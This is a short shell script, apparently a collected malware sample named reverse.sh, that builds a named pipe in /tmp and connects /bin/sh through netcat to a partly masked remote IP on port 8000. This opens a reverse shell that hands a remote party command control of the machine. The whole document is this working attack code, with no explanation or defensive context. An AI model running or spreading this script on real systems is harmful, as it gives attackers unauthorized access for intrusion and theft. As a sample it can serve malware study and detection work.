#!/bin/sh
# http://163.**.**.**/download/reverse.sh

a=$(date +%s);
backpipe="backpipe""$a";

mknod /tmp/$backpipe p;
/bin/sh 0</tmp/$backpipe | nc 163.**.**.** 8000 1>/tmp/$backpipe;

